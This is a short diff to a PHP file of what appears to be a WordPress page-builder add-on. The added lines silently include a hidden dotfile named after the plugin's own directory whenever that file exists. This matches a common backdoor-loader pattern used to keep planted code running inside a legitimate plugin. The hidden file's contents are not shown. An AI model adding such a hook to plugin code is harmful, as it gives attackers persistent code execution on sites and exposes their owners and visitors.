@@ -4,6 +4,10 @@
 \*----------------------------------------------------------------------------*/
 
 vc_add_shortcode_param( 'mpc_text', 'mpc_text_settings', mpc_get_plugin_path( __FILE__ ) . '/assets/js/mpc-params.js' );
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mpc_text_settings( $settings, $value ) {
 	$icon_wrap = isset( $settings['addon'] )  ? '<i class="mpc-add-on dashicons '. esc_attr( $settings['addon']['icon'] ) .'"></i>' : '';
 	$icon_align = isset( $settings['addon'] )  ? esc_attr( 'mpc-input-'. $settings['addon']['align'] ) : '';
